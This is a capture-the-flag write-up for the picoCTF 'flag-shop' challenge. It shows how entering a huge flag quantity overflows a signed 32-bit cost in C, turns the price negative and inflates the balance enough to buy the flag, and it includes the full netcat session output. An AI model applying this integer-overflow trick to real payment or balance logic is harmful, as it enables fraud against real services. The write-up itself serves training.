# flag-shop
This is a CTF where we have to trick the flag-shop owner to get our hands on the flag. This is very easy.

## Solution
Download the `Source` code - `store.c` mentioned in the problem and check it out. We make the below observations which we will be used in the solution(other observations may not be required)-
1. Initial balance = 1100
2. We need to make money > 100000, then we can obtain the flag. 
3. We can buy 900$ flags, but we cannot input a negative number. 
4. Our code only checks if number of input flags>0 for 900$ case

Now run the netcat link to open our flag-shop. We get various options as expected. From our understanding of code and the fact code is in "C language", we can use the concept of overflow i.e. a very huge number wraps around and becomes negative or positive(depends on number). <br>
Now we can simply input a suitable number which will become negative and using the maths of code (i.e. balance = original - cost), since cost becomes negative, our balance will increase.
<br>

Now we perform the following tasks-
```bash
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
12345678

The final cost is: -1773791688

Your current balance after transaction: 1773792788

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1773792788


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selectionWelcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
12345678

The final cost is: -1773791688

Your current balance after transaction: 1773792788

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{...flag...}
```
And we are done.
